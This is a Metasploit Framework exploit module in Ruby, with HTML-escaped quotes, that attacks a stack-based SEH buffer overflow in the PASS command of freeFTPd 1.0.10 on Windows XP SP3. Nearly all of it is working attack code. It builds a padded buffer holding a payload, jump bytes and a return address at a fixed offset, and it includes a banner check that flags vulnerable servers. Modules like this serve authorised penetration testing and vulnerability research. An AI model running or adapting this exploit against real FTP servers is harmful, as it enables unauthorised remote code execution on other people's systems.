# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
 
    include Msf::Exploit::Remote::Ftp
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;freeFTPd 1.0.10 PASS Command SEH Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a SEH stack-based buffer overflow in freeFTPd Server PASS command version 1.0.10.
                credit goes to Wireghoul.
 
            },
            &#039;Author&#039;         =>
                [
                    &#039;Wireghoul - www.justanotherhacker.com&#039;, # original poc
                    &#039;Muhamad Fadzil Ramli <fadzil [at] motivsolution.asia>&#039;, # metasploit module
                ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;OSVDB&#039;, &#039;96517&#039; ],
                    [ &#039;EDB&#039;, &#039;27747&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;seh&#039;
                },
            &#039;Privileged&#039;     => false,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 600,
                    &#039;BadChars&#039; => "\x00\x20\x0a\x0d",
                    #&#039;DisableNops&#039; => true
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows XP English SP3&#039;,   { &#039;Ret&#039; => 0x00414226 , &#039;Offset&#039; => 952 } ],
                ],
            &#039;DisclosureDate&#039; => &#039;Aug 21 2013&#039;,
            &#039;DefaultTarget&#039; => 0))
    end
 
    def check
        connect
        disconnect
 
        if (banner =~ /freeFTPd 1.0/)
            return Exploit::CheckCode::Vulnerable
        end
        Exploit::CheckCode::Safe
    end
 
    def exploit
        connect
 
        payload_size = payload.encoded.length
 
        buf = make_nops(1000)
        buf[(target[&#039;Offset&#039;]-11) - payload_size, payload_size] = payload.encoded
        buf[target[&#039;Offset&#039;]-5,5] = "\xe9\x98\xfe\xff\xff"
        buf[target[&#039;Offset&#039;],4]   = [0xfffff9eb].pack("V")
        buf[target[&#039;Offset&#039;]+4,4] = [target.ret].pack("V")
 
        print_status("Sending exploit buffer...")
 
        #buffer = Rex::Text.pattern_create(1000)
        send_user(datastore[&#039;FTPUSER&#039;])
        send_pass(buf)
 
        handler
        disconnect
    end
 
end

